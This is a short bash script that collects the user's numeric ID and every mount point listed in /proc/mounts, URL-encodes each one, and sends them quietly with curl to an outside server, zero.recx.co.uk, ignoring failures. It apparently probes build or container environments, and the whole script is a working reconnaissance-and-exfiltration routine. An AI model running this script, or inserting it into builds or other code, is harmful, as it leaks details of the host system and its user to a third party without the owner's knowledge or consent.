#!/usr/bin/env bash
set -euo pipefail

USER_ID=$(id -u)
BASE_URL="https://zero.recx.co.uk/workflow"

# URL-encode a string (python3 is present in ubuntu:22.04)
url_encode() {
    python3 -c \
        "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1], safe=''))" \
        "$1"
}

# Iterate over every mount point in /proc/mounts and fire a GET request
while IFS=' ' read -r _device mountpoint _fstype _options _dump _pass; do
    encoded_mount=$(url_encode "$mountpoint")
    curl \
        --silent \
        --show-error \
        --max-time 5 \
        --fail-with-body \
        "${BASE_URL}/${USER_ID}/${encoded_mount}" \
        || true   # don't abort on individual failures
done < /proc/mounts
